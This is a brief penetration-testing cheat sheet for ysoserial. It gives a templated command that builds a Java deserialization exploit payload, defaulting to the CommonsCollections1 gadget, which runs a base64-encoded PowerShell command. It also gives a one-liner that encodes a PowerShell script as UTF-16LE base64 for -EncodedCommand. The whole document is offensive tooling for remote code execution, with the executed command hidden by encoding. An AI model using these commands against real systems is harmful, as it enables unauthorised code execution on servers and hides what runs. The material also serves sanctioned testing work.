# Ysoserial

## java

### PowerShell payload

Generate a Java ysoserial payload that runs an encoded PowerShell command.

```sh title:"Generate Java ysoserial PowerShell payload"
java -jar ysoserial.jar "$gadget" "powershell.exe -EncodedCommand $base64_encoded_command" > "$output_file"
```
<!-- cheat
var gadget := CommonsCollections1
var base64_encoded_command
var output_file
-->

### PowerShell encode file

Encode a PowerShell script as UTF-16LE base64 on one line.

```sh title:"Ysoserial Encode PowerShell script for -EncodedCommand"
iconv -f ASCII -t UTF-16LE "$script_file" | base64 | tr -d "\n"
```
<!-- cheat
var script_file
-->
